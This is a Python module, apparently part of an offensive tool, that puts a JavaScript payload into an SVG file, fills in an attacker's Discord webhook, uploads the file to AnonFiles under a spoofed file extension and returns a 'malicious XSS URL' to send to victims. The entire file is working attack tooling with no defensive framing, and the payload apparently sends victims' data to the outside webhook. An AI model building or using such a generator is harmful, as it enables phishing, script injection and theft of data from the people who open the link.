#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: core/exploit.py
"""

import requests

__SVG__ = r"""<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"><script>%malscript%</script></svg>
"""

def generate(webhook: str, file_name: str, file_extension: str) -> list[str, str]:
    """merge parameters with malicious payload, post payload to AnonFiles
       & get recieved malicious URL from AnonFiles

    Args:
        webhook (str): users discord webhook to post to
        file_name (str): file name to post to AnonFiles
        file_extension (str): file extension to spoof

    Returns:
        list[str, str]: frontend alert/error, URL/None
    """
    with open("core/payload.js", "r") as payload:
        script = payload.read()
        script = '\t\t'.join(script.splitlines())
        script = script.replace("%webhook%", webhook)
        print(webhook)

    svg_bytes = __SVG__.replace("%malscript%", script).encode("utf-8")
    try:
        r = requests.post("https://api.anonfiles.com/upload",
                          files={"file": (f"{file_name}.{file_extension}", svg_bytes)})
        url = r.json()["data"]["file"]["url"]["full"]
    except Exception as error:
        return "Failed to generate malicious AnonFiles XSS URL, error: {}".format(error), None

    return "Successfully generated malicious AnonFiles XSS URL", url